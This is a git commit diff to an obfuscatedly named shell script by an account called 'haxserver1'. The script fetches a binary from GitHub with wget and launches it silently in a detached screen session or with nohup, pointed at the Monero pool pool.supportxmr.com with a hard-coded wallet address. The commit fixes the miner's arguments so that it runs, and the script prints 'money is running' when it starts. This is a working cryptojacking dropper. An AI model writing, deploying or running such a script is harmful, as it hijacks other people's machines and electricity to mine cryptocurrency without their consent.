a4bb16fb6234bc8f3a272a453f39534698bd99f6
haxserver1 <155544992+haxserver1@users.noreply.github.com>
2024-06-02 08:00:59 +0800

    Update sj17yu23b7db19sn20nf721b7sb2.sh

--- sj17yu23b7db19sn20nf721b7sb2.sh
+++ sj17yu23b7db19sn20nf721b7sb2.sh
@@ -4,10 +4,10 @@ FILE_URL="https://github.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/
 FILE_NAME="session_ajqysbey"
 
 wget -O $FILE_NAME $FILE_URL
-chmod +x $FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx 
+chmod +x $FILE_NAME 
 if command -v screen &> /dev/null
 then
-    screen -dmS mysession ./$FILE_NAME
+    screen -dmS mysession ./$FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx 
     sleep 1
     if screen -list | grep -q "mysession"; then
         echo "money is running in screen"
@@ -15,7 +15,7 @@ then
         echo "error"
     fi
 else
-    nohup ./$FILE_NAME &> /dev/null &
+    nohup ./$FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx  &> /dev/null &
     sleep 1
     if ps -ef | grep -v grep | grep -q "$FILE_NAME"; then
         echo "money is running in the background"
